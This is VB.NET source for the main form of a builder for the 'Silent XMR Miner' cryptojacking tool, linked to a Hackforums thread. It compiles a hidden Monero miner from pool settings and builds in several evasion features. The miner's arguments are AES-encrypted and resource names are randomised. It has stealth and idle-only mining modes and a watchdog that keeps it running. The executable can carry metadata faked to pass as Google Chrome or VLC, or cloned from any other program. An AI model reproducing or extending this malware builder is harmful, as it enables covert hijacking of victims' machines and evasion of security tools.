Imports System.IO
Imports System.Security.Cryptography
Imports System.Text

Public Class Form1
    Public rand As New Random()
    Public advancedParams As String = "--algo=rx/0 --asm=auto --cpu-memory-pool=1 --randomx-mode=auto --randomx-no-rdmsr  --cuda-bfactor-hint=12 --cuda-bsleep-hint=100"
    Public watchdogdata As Byte() = New Byte() {}
    Public FA As New Advanced

    'Silent XMR Miner by Unam Sanctam https://github.com/UnamSanctam/SilentXMRMiner, based on Lime Miner by NYAN CAT https://github.com/NYAN-x-CAT/Lime-Miner

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
        Font = New Font("Segoe UI", 9.5F, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont)
        FA.Font = New Font("Segoe UI", 9.5F, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont)

        CheckForIllegalCrossThreadCalls = False
        Codedom.F = Me
        FA.F = Me


        FA.txtAdvParam.Text = advancedParams
    End Sub

    Public OutputPayload
    Public Resources_dll = Randomi(rand.Next(5, 40))
    Public Resources_xmr = Randomi(rand.Next(5, 40))
    Public Resources_xmrig = Randomi(rand.Next(5, 40))
    Public Resources_libs = Randomi(rand.Next(5, 40))
    Public Resources_watchdog = Randomi(rand.Next(5, 40))
    Public Resources_winring = Randomi(rand.Next(5, 40))
    Public Resources_Parent = Randomi(rand.Next(5, 40))

    Public AESKEY As String = Randomi(256)
    Public SALT As String = Randomi(32)
    Public IV As String = Randomi(16)

    Public InjectionTarget As String()
    Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
        Try
            If toggleEnableIdle.Checked AndAlso (Not IsNumeric(txtIdleWait.Text) OrElse CInt(txtIdleWait.Text) <= 0) Then
                MsgBox("Idle Wait time must be a number and above 0 minutes.", MsgBoxStyle.Exclamation)
            Else
                If txtPoolUsername.Text <> "" AndAlso txtPoolURL.Text <> "" Then
                    Dim s As New SaveFileDialog
                    s.Filter = "Executable |*.exe"
                    s.InitialDirectory = Application.StartupPath
                    If s.ShowDialog = DialogResult.OK Then
                        OutputPayload = s.FileName
                        BackgroundWorker2.RunWorkerAsync()
                        btnBuild.Enabled = False
                        btnBuild.Text = "Please wait..."
                    End If
                Else
                    MsgBox("Please enter valid pool settings.", MsgBoxStyle.Exclamation)
                    MephTabcontrol2.SelectedIndex = 0
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub BackgroundWorker2_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork

        Try
            If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.ResetText()) : Else : txtLog.ResetText() : End If
            InjectionTarget = txtInjection.Text.Split(" ")
            txtLog.Text = txtLog.Text + ("Starting..." + vbNewLine)
            txtLog.Text = txtLog.Text + ("Replacing strings..." + vbNewLine)
            Dim minerbuilder As New StringBuilder(My.Resources.Program)
            Dim argstr As String = " --cinit-find-x -B " & If(FA.chkAdvanced.Checked, FA.txtAdvParam.Text, advancedParams) & " --url=" & txtPoolURL.Text & " --user=" & txtPoolUsername.Text & " --pass=" & txtPoolPassowrd.Text & " --cpu-max-threads-hint=" & txtMaxCPU.Text.Replace("%", "") & If(FA.chkRemoteConfig.Checked, " --cinit-remote-config=""" & Unamlib_Encrypt(FA.txtRemoteConfig.Text) & """", "") & " --donate-level=5 "

            minerbuilder.Replace("#dll", Resources_dll)
            minerbuilder.Replace("#xmr", Resources_xmrig)
            minerbuilder.Replace("#libs", Resources_libs)
            minerbuilder.Replace("#winring", Resources_winring)
            minerbuilder.Replace("#watchdog", Resources_watchdog)
            minerbuilder.Replace("#ParentRes", Resources_Parent)

            If toggleEnableIdle.Checked Then
                argstr += " --cinit-idle-wait=" & txtIdleWait.Text & " --cinit-idle-cpu=" & txtIdleCPU.Text.Replace("%", "") & " "
            End If

            If toggleEnableNicehash.Checked Then
                argstr += " --nicehash "
            End If

            If toggleEnableCPU.Checked = False Then
                argstr += " --no-cpu "
            End If

            If toggleSSLTLS.Checked Then
                argstr += " --tls "
            End If

            If toggleEnableStealth.Checked Then
                argstr += " --cinit-stealth "
            End If

            minerbuilder.Replace("#ARGSTR", EncryptString(argstr))

            If chkInstall.Checked Then
                txtLog.Text = txtLog.Text + ("Adding install... " + vbNewLine)

                If toggleWatchdog.Checked Then

                    txtLog.Text = txtLog.Text + ("Compiling Watchdog..." + vbNewLine)
                    Dim watchdogpath = Path.GetDirectoryName(OutputPayload) & "\" & Path.GetFileNameWithoutExtension(OutputPayload) & "-watchdog"

                    Codedom.WatchdogCompiler(watchdogpath & ".dll", My.Resources.Watchdog)
                    If Codedom.WatchdogOK Then
                        txtLog.Text = txtLog.Text + ("Compiled Watchdog DLL!" + vbNewLine)
                        If FA.toggleObfuscation.Checked Then
                            MessageBox.Show("The Watchdog DLL has been compiled and can be found in the same folder as the chosen miner path (" & watchdogpath & ".dll" & "). Press OK after you're done with obfuscating the Watchdog DLL.")
                        End If
                        Codedom.LoaderCompiler(watchdogpath & ".exe", File.ReadAllBytes(watchdogpath & ".dll"))

                        If Codedom.LoaderOK Then
                            txtLog.Text = txtLog.Text + ("Compiled Watchdog loader!" + vbNewLine)
                            watchdogdata = File.ReadAllBytes(watchdogpath & ".exe")
                            File.Delete(watchdogpath & ".dll")
                            File.Delete(watchdogpath & ".exe")
                        Else
                            BuildError("Error compiling Watchdog loader!")
                            Return
                        End If
                    Else
                        BuildError("Error compiling Watchdog DLL!")
                        Return
                    End If
                End If
            End If

            Dim MinerSource = minerbuilder.ToString

            Dim minerpath As String = Path.GetDirectoryName(OutputPayload) & "\" & Path.GetFileNameWithoutExtension(OutputPayload) & "-miner.dll"
            Codedom.MinerCompiler(minerpath, MinerSource, Resources_Parent)
            If Codedom.MinerOK Then
                txtLog.Text = txtLog.Text + ("Compiled Miner DLL!" + vbNewLine)
                If FA.toggleObfuscation.Checked Then
                    MessageBox.Show("The Miner DLL has been compiled and can be found in the same folder as the chosen miner path (" & minerpath & "). Press OK after you're done with obfuscating the Miner DLL.")
                End If
                Codedom.LoaderCompiler(OutputPayload, File.ReadAllBytes(minerpath), If(chkIcon.Checked AndAlso txtIconPath.Text IsNot "", txtIconPath.Text, Nothing), FA.toggleAdministrator.Checked)
                If FA.toggleUninstaller.Checked Then
                    Codedom.UninstallerCompiler(Path.GetDirectoryName(OutputPayload) & "\" & Path.GetFileNameWithoutExtension(OutputPayload) & "-uninstaller.exe")
                End If

                If Codedom.LoaderOK Then
                    txtLog.Text = txtLog.Text + ("Compiled Miner loader!" + vbNewLine)
                    txtLog.Text = txtLog.Text + ("Done!" + vbNewLine)
                    If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                    btnBuild.Enabled = True

                    Try
                        File.Delete(minerpath)
                        File.Delete(Path.GetTempPath + "\" + Resources_Parent + ".Resources")
                    Catch ex As Exception
                    End Try
                Else
                    BuildError("Error compiling Miner loader!")
                    Return
                End If
            Else
                BuildError("Error compiling Miner DLL!")
                Return
            End If

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
            If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
            btnBuild.Enabled = True
            Return
        End Try

    End Sub

    Public Sub BuildError(ByVal message As String)
        txtLog.Text = txtLog.Text + (message + vbNewLine)
        If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
        btnBuild.Enabled = True
    End Sub

    Public Function AES_Encryptor(ByVal input As Byte()) As Byte()
        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes(IV)
        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes(SALT)
        Dim k1 As New Rfc2898DeriveBytes(AESKEY, saltValueBytes, 100)
        Dim symmetricKey As New RijndaelManaged
        symmetricKey.KeySize = 256
        symmetricKey.Mode = CipherMode.CBC
        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(k1.GetBytes(16), initVectorBytes)
        Using mStream As New MemoryStream()
            Using cStream As New CryptoStream(mStream, encryptor, CryptoStreamMode.Write)
                cStream.Write(input, 0, input.Length)
                cStream.Close()
            End Using
            Return mStream.ToArray()
        End Using
    End Function

    Public Function Unamlib_Encrypt(ByVal plainText As String) As String
        Dim plainTextBytes As Byte() = Encoding.UTF8.GetBytes(plainText)
        Dim keyBytes = Encoding.ASCII.GetBytes("UXUUXUUXUUCommandULineUUXUUXUUXU")
        Dim iv As Byte() = Encoding.ASCII.GetBytes("UUCommandULineUU")
        Dim symmetricKey = New RijndaelManaged() With {
            .Mode = CipherMode.CBC,
            .Padding = PaddingMode.Zeros,
            .BlockSize = 128,
            .KeySize = 256
        }
        Dim encryptor = symmetricKey.CreateEncryptor(keyBytes, iv)
        Dim cipherTextBytes As Byte()

        Using memoryStream = New MemoryStream()

            Using cryptoStream = New CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write)
                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length)
                cryptoStream.FlushFinalBlock()
                cipherTextBytes = memoryStream.ToArray()
                cryptoStream.Close()
            End Using

            memoryStream.Close()
        End Using

        Return Convert.ToBase64String(cipherTextBytes)
    End Function

    Public Function EncryptString(ByVal input As String)
        Return Convert.ToBase64String(AES_Encryptor(Encoding.ASCII.GetBytes(input)))
    End Function

    Public Function Randomi(ByVal length As Integer) As String
        Dim Chr As String = "asdfghjklqwertyuiopmnbvcxz"
        Dim sb As New Text.StringBuilder()
        For i As Integer = 1 To length
            Dim idx As Integer = rand.Next(0, Chr.Length)
            sb.Append(Chr.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function

    Private Sub chkInstall_CheckedChanged(sender As Object) Handles chkInstall.CheckedChanged
        If chkInstall.Checked Then
            chkInstall.Text = "Enabled"
            txtInstallPathMain.Enabled = True
            txtInstallFileName.Enabled = True
        Else
            chkInstall.Text = "Disabled"
            txtInstallPathMain.Enabled = False
            txtInstallFileName.Enabled = False
        End If
    End Sub

    Private Sub chkAssembly_CheckedChanged(sender As Object) Handles chkAssembly.CheckedChanged
        If chkAssembly.Checked Then
            chkAssembly.Text = "Enabled"
            txtTitle.Enabled = True
            txtDescription.Enabled = True
            txtProduct.Enabled = True
            txtCompany.Enabled = True
            txtCopyright.Enabled = True
            txtTrademark.Enabled = True
            num_Assembly1.Enabled = True
            num_Assembly2.Enabled = True
            num_Assembly3.Enabled = True
            num_Assembly4.Enabled = True
            btn_assemblyRandom.Enabled = True
            btn_assemblyClone.Enabled = True
        Else
            chkAssembly.Text = "Disabled"
            txtTitle.Enabled = False
            txtDescription.Enabled = False
            txtProduct.Enabled = False
            txtCompany.Enabled = False
            txtCopyright.Enabled = False
            txtTrademark.Enabled = False
            num_Assembly1.Enabled = False
            num_Assembly2.Enabled = False
            num_Assembly3.Enabled = False
            num_Assembly4.Enabled = False
            btn_assemblyRandom.Enabled = False
            btn_assemblyClone.Enabled = False
        End If
    End Sub

    Private Sub btn_assemblyRandom_Click(sender As Object, e As EventArgs) Handles btn_assemblyRandom.Click
        Try
            Select Case rand.Next(4)
                Case 0
                    txtTitle.Text = "chrome.exe"
                    txtDescription.Text = "Google Chrome"
                    txtProduct.Text = "Google Chrome"
                    txtCompany.Text = "Google Inc."
                    txtCopyright.Text = "Copyright 2017 Google Inc. All rights reserved."
                    txtTrademark.Text = ""
                    num_Assembly1.Text = "70"
                    num_Assembly2.Text = "0"
                    num_Assembly3.Text = "3538"
                    num_Assembly4.Text = "110"

                Case 1
                    txtTitle.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtDescription.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtProduct.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtCompany.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtCopyright.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtTrademark.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    num_Assembly1.Text = rand.Next(0, 10)
                    num_Assembly2.Text = rand.Next(0, 10)
                    num_Assembly3.Text = rand.Next(0, 10)
                    num_Assembly4.Text = rand.Next(0, 10)

                Case 2
                    txtTitle.Text = "vlc"
                    txtDescription.Text = "VLC media player"
                    txtProduct.Text = "VLC media player"
                    txtCompany.Text = "VideoLAN"
                    txtCopyright.Text = "Copyright © 1996-2018 VideoLAN and VLC Authors"
                    txtTrademark.Text = "VLC media player, VideoLAN and x264 are registered trademarks from VideoLAN"
                    num_Assembly1.Text = "3"
                    num_Assembly2.Text = "0"
                    num_Assembly3.Text = "3"
                    num_Assembly4.Text = "0"

                Case 3
                    txtTitle.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtDescription.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtProduct.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtCompany.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtCopyright.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtTrademark.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    num_Assembly1.Text = rand.Next(0, 10)
                    num_Assembly2.Text = rand.Next(0, 10)
                    num_Assembly3.Text = rand.Next(0, 10)
                    num_Assembly4.Text = rand.Next(0, 10)

            End Select
        Catch : End Try
    End Sub

    Private Sub btn_assemblyClone_Click(sender As Object, e As EventArgs) Handles btn_assemblyClone.Click
        Dim o As New OpenFileDialog
        o.Filter = "Executable |*.exe"
        If o.ShowDialog = DialogResult.OK Then
            Dim info As FileVersionInfo = FileVersionInfo.GetVersionInfo(o.FileName)

            Try
                txtTitle.Text = info.InternalName
                txtDescription.Text = info.FileDescription
                txtProduct.Text = info.CompanyName
                txtCompany.Text = info.ProductName
                txtCopyright.Text = info.LegalCopyright
                txtTrademark.Text = info.LegalTrademarks
            Catch ex As Exception
            End Try



            Dim version As String()
            If info.FileVersion.Contains(",") Then
                version = info.FileVersion.Split(","c)
            Else
                version = info.FileVersion.Split("."c)
            End If

            Try
                num_Assembly1.Text = version(0)
                num_Assembly2.Text = version(1)
                num_Assembly3.Text = version(2)
                num_Assembly4.Text = version(3)
            Catch ex2 As Exception
            End Try
        End If
    End Sub

    Private Sub chkIcon_CheckedChanged(sender As Object) Handles chkIcon.CheckedChanged
        If chkIcon.Checked Then
            chkIcon.Text = "Enabled"
            btnBrowseIcon.Enabled = True
        Else
            chkIcon.Text = "Disabled"
            btnBrowseIcon.Enabled = False
        End If
    End Sub

    Private Sub btnBrowseIcon_Click(sender As Object, e As EventArgs) Handles btnBrowseIcon.Click
        Try
            Dim o As New OpenFileDialog
            o.Filter = "Icon |*.ico"
            If o.ShowDialog = DialogResult.OK Then
                txtIconPath.Text = o.FileName
                picIcon.ImageLocation = o.FileName
            Else
                txtIconPath.Text = ""
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub MephTabControl2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles MephTabcontrol2.SelectedIndexChanged
        On Error Resume Next
        If Me.MephTabcontrol2.SelectedIndex = 0 Then
        End If
    End Sub

    Private Sub labelGitHub_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles labelGitHub.LinkClicked
        Process.Start("https://github.com/UnamSanctam/SilentXMRMiner")
    End Sub

    Private Sub labelHackforums_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles labelHackforums.LinkClicked
        Process.Start("https://hackforums.net/showthread.php?tid=5995773")
    End Sub

    Private Sub labelWiki_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles labelWiki.LinkClicked
        Process.Start("https://github.com/UnamSanctam/SilentXMRMiner/wiki")
    End Sub

    Private Sub toggleEnableIdle_CheckedChanged(sender As Object) Handles toggleEnableIdle.CheckedChanged
        If toggleEnableIdle.Checked Then
            txtIdleCPU.Enabled = True
            txtIdleWait.Enabled = True
        Else
            txtIdleCPU.Enabled = False
            txtIdleWait.Enabled = False
        End If
    End Sub

    Private Sub MephButton1_Click(sender As Object, e As EventArgs) Handles MephButton1.Click
        FA.Show()
    End Sub
End Class
